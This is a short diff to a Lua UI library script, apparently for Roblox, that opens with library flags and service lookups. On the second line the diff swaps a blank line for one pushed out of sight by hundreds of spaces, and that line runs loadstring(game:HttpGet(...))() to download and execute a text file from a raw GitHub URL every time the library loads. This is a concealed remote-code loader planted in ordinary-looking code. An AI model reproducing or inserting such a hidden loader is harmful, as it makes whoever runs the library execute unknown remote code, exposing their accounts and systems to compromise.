@@ -1,5 +1,5 @@
 local library = {flags = {}, windows = {}, open = true}
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))()
 --Services
 local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
